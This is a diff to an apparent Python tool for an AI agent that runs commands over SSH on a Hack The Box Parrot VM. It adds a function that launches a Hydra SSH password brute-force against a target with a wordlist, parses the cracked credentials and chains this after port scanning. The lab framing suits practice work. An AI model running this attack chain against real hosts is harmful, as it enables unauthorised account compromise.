@@ -8,10 +8,12 @@ description: Executes commands on my remote HTB Parrot OS VM and returns the out
 import paramiko
 import os
 import logging
+import time
 import re
 from typing import Tuple, Optional, Dict, List
 from langchain_community.chat_message_histories import ChatMessageHistory
 import ast
+from contextlib import contextmanager
 
 logging.basicConfig(
     level=logging.INFO,
@@ -29,8 +31,29 @@ logger.info("Loading SSH Command Executor") #using logging module over print sta
 class Tools:
     def __init__(self, memory: ChatMessageHistory = None):
         self.memory = memory if memory is not None else ChatMessageHistory() #Initialize or use provided memory
+
+    @contextmanager
+    def ssh_client(self, host: str, username: str, timeout: int = 300):
+        """
+        Context manager for SSH client connection with timeout and optional key.
+        
+        Args:
+            host (str): The IP address of the VM to SSH into.
+            username (str): The SSH username for the host VM.
+            timeout (int): Maximum connection time in seconds (default: 300).
+        """
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        try:
+            client.connect(host, username=username, key_filename="/Users/elladuffy/.ssh/id_rsa", passphrase=os.environ.get("SSH_PASSPHRASE")) #key_filename = "/app/tools/id_rsa"  -- for Open WebUI
+            yield client
+        except Exception as e:
+            logger.error(f"SSH connection error: {str(e)}")
+            raise
+        finally:
+            client.close()
     
-    def ssh_command_executor(self, host: str, username: str, command: str) -> str:
+    def ssh_command_executor(self, host: str, username: str, command: str, timeout: int = 300) -> str:
         """
         Execute a command on my remote HTB Parrot OS VM using the SSH agent for authentication.
     
@@ -38,6 +61,7 @@ class Tools:
             host (str): The IP address or hostname of the HTB VM (e.g., '192.168.1.100').
             username (str): The SSH username (e.g., 'parrot' or 'user').
             command (str): The command to execute (e.g., 'whoami').
+            timeout (int): Maximum execution time in seconds (default: 300).
     
         Returns:
             str: The output of the command (stdout + stderr).
@@ -46,31 +70,41 @@ class Tools:
             ValueError: If the SSH_PASSPHRASE environment variable is not set.
         """
         logger.info(f"Connecting to {host} as {username}")
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        #key_path = "/app/tools/id_rsa"  # Path inside the container
-        key_path = "/Users/elladuffy/.ssh/id_rsa" # Local testing
         passphrase = os.environ.get("SSH_PASSPHRASE")
         if not passphrase:
             logger.error("SSH_PASSPHRASE environment variable not set")
             raise ValueError("SSH_PASSPHRASE environment variable not set")
         try:
-            client.connect(host, username=username, key_filename=key_path, passphrase=passphrase)
-            full_command = f"PATH=$PATH:/sbin:/usr/sbin {command}"
-            logger.info(f"Executing command: {full_command}")
-            stdin, stdout, stderr = client.exec_command(full_command)
-            stderr_data = stderr.read().decode()
-            if stderr_data:
-                logger.warning(f"Command stderr: {stderr_data.strip()}")
-            result = stdout.read().decode() + stderr.read().decode()
-            logger.info(f"Command output:\n {result}")
-            return result
-        except Exception as e:
+            start_time = time.time()
+            with self.ssh_client(host, username, timeout) as client:
+                full_command = f"PATH=$PATH:/sbin:/usr/sbin {command}"
+                logger.info(f"Executing command: {full_command}")
+                channel = client.get_transport().open_session()
+                channel.settimeout(timeout)
+                channel.exec_command(full_command)
+                output = []
+                while not channel.exit_status_ready():
+                    if channel.recv_ready():
+                        output.append(channel.recv(1024).decode())
+                    time.sleep(0.1)  # Brief pause to avoid busy-waiting
+                    if time.time() - start_time > timeout:
+                        logger.warning(f"Command timed out after {timeout} seconds")
+                        channel.close()
+                        raise TimeoutError(f"Command timed out after {timeout} seconds")
+                if channel.recv_stderr_ready():
+                    error = channel.recv_stderr(1024).decode()
+                    if error:
+                        logger.warning(f"Command stderr: {error.strip()}")
+                        output.append(error)
+                result = "".join(output).strip()
+                logger.info(f"Command output:\n{result}")
+                return result
+        except paramiko.SSHException as e:
             logger.error(f"SSH execution failed: {str(e)}")
             raise
-        finally:
-            client.close()
-            logger.debug("SSH connection closed")
+        except Exception as e:
+            logger.error(f"Unexpected error: {str(e)}")
+            raise
     
     def scan_ports(self, host: str, username: str, target: str) -> Dict[str, str]:
         """
@@ -216,6 +250,52 @@ class Tools:
             logger.error(f"Error detecting SSH port: {str(e)}")
             self.memory.add_message({"role": "assistant", "content": f"Error detecting SSH port on {target}: {str(e)}"})
             return None
+        
+    def run_hydra_attack(self, host: str, username: str, target: str, target_username: str, password_file: str, port: int = 22, protocol: str = "ssh") -> Dict[str, str]:
+        """
+        Run a Hydra password attack on the target using the specified username and password list.
+        
+        Args:
+            host (str): The IP address of the VM to SSH into (e.g., '10.0.0.215').
+            username (str): The SSH username for the host VM (e.g., 'user').
+            target (str): The target IP address to attack (e.g., '10.10.10.76').
+            target_username (str): The username to test on the target (e.g., 'sunny').
+            password_file (str): Path to the password list (e.g., '/usr/share/seclists/Passwords/probable-v2-top1575.txt').
+            port (int): The port to target (e.g., 22022).
+            protocol (str): The protocol to use (e.g., 'ssh', default is 'ssh').
+
+        Returns:
+            dict: Dictionary of username:password pairs that succeed.
+        """
+        logger.info(f"Starting Hydra attack on {target} for {target_username} with port {port}")
+        command = f"hydra -l {target_username} -P {password_file} {protocol}://{target} -s {port}"
+        try:
+            # Execute Hydra command via SSH on the host VM
+            output = self.ssh_command_executor(host, username, command)
+            # Parse output for successful login with improved logic
+            credentials = {}
+            for line in output.splitlines():
+                if "[ssh]" in line and "login:" in line and "password:" in line:
+                    # Extract username and password from the line
+                    login_index = line.index("login:") + len("login:")
+                    password_index = line.index("password:")
+                    cred_user = line[login_index:password_index].strip()
+                    cred_pass = line[password_index + len("password:"):].strip()
+                    if cred_user and cred_pass:
+                        credentials[cred_user] = cred_pass
+                        break  # Stop after first success (adjust if multiple logins possible)
+            if credentials:
+                self.memory.add_message({"role": "assistant", "content": f"Hydra success: {credentials} on {target}"})
+                return credentials
+            else:
+                self.memory.add_message({"role": "assistant", "content": f"No successful logins on {target}"})
+                logger.warning("No successful logins detected.")
+                return {}
+        except Exception as e:
+            logger.error(f"Hydra attack failed: {str(e)}")
+            self.memory.add_message({"role": "assistant", "content": f"Hydra failed on {target}: {str(e)}"})
+        return {}
+        
 
     def main(self, host: str, username: str, target: str):
         logger.info(f"Starting attack chain on {target} via {host}")
@@ -238,8 +318,9 @@ class Tools:
         else:
             logger.warning("No SSH port detected")
 
-        logger.info("Run again to check memory functionality...")
-        ssh_port2 = self.detect_ssh_port(host, username, target)
+        #Testing Hydra - hard code inputs
+        hydra = self.run_hydra_attack(host, username, target, 'sunny', '/usr/share/seclists/Passwords/probable-v2-top1575.txt', ssh_port)
+        logger.info(f"Hydra findings: {hydra}")
 
 if __name__ == "__main__":
     tools = Tools()
